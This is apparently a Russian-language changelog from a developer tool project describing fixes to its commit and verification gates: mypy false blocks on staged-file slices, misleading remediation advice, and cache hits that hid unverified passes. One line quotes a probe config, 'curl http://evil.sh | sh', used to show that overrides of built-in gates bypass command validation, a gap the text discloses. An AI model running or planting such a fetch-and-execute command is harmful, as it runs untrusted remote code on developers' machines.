...
- **Гейт `mypy` отбивал коммиты из-за артефакта собственного среза (`mypy-commit-slice-any-false-block`).** На триггере `commit` гейт судит временное дерево из одних застейдженных файлов, поэтому каждый неизменённый сосед для него — отсутствующий модуль, `--ignore-missing-imports` типизирует его как `Any`, и однострочный делегат (`return self.be.task_get(slug)`) валится на `no-any-return` в коде, который полное дерево принимает. Поймано живьём дважды — `service_gates.py` в сессии #37, `project_service.py` в #38 — и дважды залатано аннотацией возврата, что чинило точки, а не класс. В этот раз не угадано, а замерено: каждый модуль `scripts/` развёрнут в одиночку ровно так, как это делает хук, и **падают 23 из 150, 64 точки — и все 64 относятся к `no-any-return`, других кодов ошибок нет вообще**. Деградация до `Any` порождает ровно один класс ложных блоков, поэтому ровно этот код теперь гасится ровно на этом триггере через новое поле гейта `trigger_args` (`{триггер: доп. аргументы}`, дописываются к `command` только на своём триггере); на `task-done` `no-any-return` продолжает работать по рабочему дереву, где граф полон и вердикт что-то значит. У скана был контроль на известном ответе: на `service_gates.py` **до** обхода сессии #37 он нашёл ровно 4 ожидаемые точки. Обе стороны доказаны прогоном настоящего `gate_runner.py commit --files-from`: срез из одного делегата проходит (`exit=0`), тот же срез с отключённым `_apply_trigger_args` падает теми же пятью строками `no-any-return`, что блокировали коммит, а настоящая ошибка типов внутри среза по-прежнему блокирует. `trigger_args` проходит ту же проверку безопасности, что и `command` (шелл-операторы запрещены — аргументы приклеиваются к командной строке), и проверяется по форме в `stack_schema`, где незнакомый триггер в ключе — ошибка, а не молча неработающая запись. Охват у этой проверки тот же, что был у проверки `command`, и не больше: `load_gates` валидирует только имена гейтов, которых нет в `DEFAULT_GATES`, поэтому override встроенного не проверяет никто — замерено на конфиге с `gates.mypy.command = "curl http://evil.sh | sh"`, который вышел из `load_gates` дословно, тогда как та же строка под новым именем гейта была отброшена. Заведено задачей `gate-override-skips-command-validation`, а не починено здесь: отказ от override меняет поведение проектов, где его ставят осознанно. Четыре аннотированных возврата в `service_gates.py` возвращены к прямым, раз класс закрыт. Новое: `tests/test_gate_trigger_args.py` (19 тестов, три мутации проверены исполнением). Неверная мотивировка, которую опроверг этот дефект — «цена ограничена: деградация до `Any` стоит только ложных пропусков» — исправлена в `default_gates.py` и в `docs/{en,ru}/hooks.md`, где повторялась дословно.

- **Советы гейтов вели в никуда — выполнил ремедиацию, всё равно отбивает (`remediation-advice-does-not-remediate`).** Три места, где текст, обещавший починку, к ней не приводил. **(1)** Пропущенный scoped-гейт советовал «Pass --relevant-files», а у `tausik verify` такого флага нет вовсе — `verify --help` знает только `--task` и `--scope`. Выполнивший совет дословно получал ошибку разбора аргументов; флаг живёт у `task update` и `task done`, теперь совет называет именно их и прямо предупреждает, что у самого `verify` его нет. Тот же неверный текст правился и в `service_verification`. **(2)** Кэш ОТМЫВАЛ пропуск. `record_run` пишет зелёную строку при `has_real_pass` **или** `scope='manual'`, то есть закэшированная запись может быть операторским утверждением, за которым не стоит ни один прогон гейта. На промахе кэша об этом честно предупреждали, а на попадании — нет: замер дал `passed=True status=hit gates=[]` и ни слова о том, что проверено ничего. Пустой список гейтов при `passed=True` читается как зелёная верификация, и по правилу MCP-first агент видит именно эту форму. Теперь `run_gates_with_cache` отдаёт найденную строку через необязательный `cache_hit_fn` (расширять кортеж возврата нельзя — ровно три значения распаковывают около тридцати мест), а `run_verify_for_task` на попадании в asserted-строку выдаёт предупреждение с номером прогона. На попадании в настоящий gate-pass предупреждения нет — проверено негативным контролем. **(3)** `gen_doc_constants.py` переписывал только `constants.json`, хотя его же `--check` судит и бейджи в `README.md` / `README.ru.md`. Так как тот же прогон поднимал `test_count`, совет «run `gen_doc_constants.py` and re-commit» не просто не доводил до конца, а САМ ДЕЛАЛ `--check` красным: замер — до совета exit 0, после совета exit 1 на четырёх дрейфах. Новый `scripts/doc_test_count_fix.py` правит ссылки на число тестов вне fenced-блоков (позиции берутся посегментно: `_strip_fenced_blocks` сохраняет количество строк, но не смещения, и по нему заменять нельзя), генератор вызывает его сам. Попутно найдено ТРЕТЬЕ число: `README.md:18` держал «covered by 3378 tests» при бейдже 3583 двумя строками выше и живых 3610 — фраза не попадала ни под один паттерн; добавлен узкий паттерн, разрешающий перенос строки внутри цитаты (`covered\n> by N tests`). Доказано прогоном «до → выполнил совет дословно → после»: exit 1 → генератор поправил оба README → exit 0. Новое: `scripts/doc_test_count_fix.py`, `tests/test_remediation_advice_executable.py` (15 тестов — флаги из текста совета скармливаются настоящему argparse-дереву CLI, генератор прогоняется на репозитории с посеянным дрейфом, кэш-попадание проверяется на manual- и на настоящей строке). Пять мутаций, каждая роняет тесты. Правки перевалили `gen_doc_constants.py` и `service_gates.py` за лимит гейта filesize, поэтому выделены `scripts/doc_drift_patterns.py` (цели сканирования и регулярки; реэкспортируются, чтобы существующие импорты не поехали) и `scripts/gate_verify_warning.py` (формулировка предупреждения чистой функцией — текст и есть предмет этой задачи, его надо уметь проверять без подключения к БД).

- **Гейт `mypy` блокировал коммит, в котором ничего не проверял (`mypy-gate-false-block-on-excluded-slice`).** Команда намеренно идёт без `{files}` и берёт область из `[tool.mypy]` (`files = ["scripts"]`, `exclude = ["scripts/hooks/"]`). На триггере `commit` гейт судит временное дерево, куда `checkout-index` кладёт **только staged-содержимое**, поэтому коммит, не задевающий эту область, оставлял конфигу пустой набор: mypy выходил с ошибкой использования, и severity=block отбивал коммит, в котором проверка типов не выполнялась вообще. Первая попытка чинить это распознаванием сообщения mypy (`cd9db84`) не сработала и оставила дефект наполовину живым: формулировок **три**, и они зависят от того, есть ли настроенный каталог в срезе вообще. Замер на mypy 2.3.0 — срез только из `scripts/hooks/` даёт `There are no .py[i] files in directory 'scripts'` (маркер ловил), срез вовсе без `scripts/` даёт `mypy: error: Cannot read file 'scripts': No such file or directory` (не ловил), то есть блокировался **любой** коммит в одни лишь доки, тесты или `requirements.txt`. Сигнатура по прозе чужого инструмента заменена чтением его конфига: новый `scripts/gate_config_scope.py` читает `[tool.mypy] files/exclude` через `tomllib` и до запуска отвечает, попадает ли в область хоть один файл среза; `_NOTHING_TO_CHECK_MARKERS` удалён целиком. Неизвестный инструмент, отсутствующий или битый конфиг дают «нет мнения» — гейт запускается, пропуск никогда не является дефолтом. Пропуск действует **только** на `commit`, где срез и есть всё дерево: на `task-done`/`verify`/`review` mypy судит реальное дерево, и пустое пересечение с `relevant_files` означает суженный прогон, а не «нечего проверять». Попутно: `format_results` печатал причину только для FAIL, поэтому пропуск доходил до человека голым `[SKIP] mypy` — неотличимо от пройденной проверки; теперь причина печатается и говорит прямым текстом, что запуска не было и это не пройденная проверка. Новое: `scripts/gate_config_scope.py`, `tests/test_gate_config_scope.py` (28 тестов). Тест в `test_gates.py`, закреплявший распознавание по тексту, переписан на обратное утверждение: та же формулировка без подтверждения от конфига обязана блокировать. Доказано живым прогоном `gate_runner.py commit --files-from` на четырёх срезах (hooks-only и «без `scripts/`» проходят, ошибка типов и смешанный срез блокируют) и пятью мутациями, каждая из которых роняет тесты.
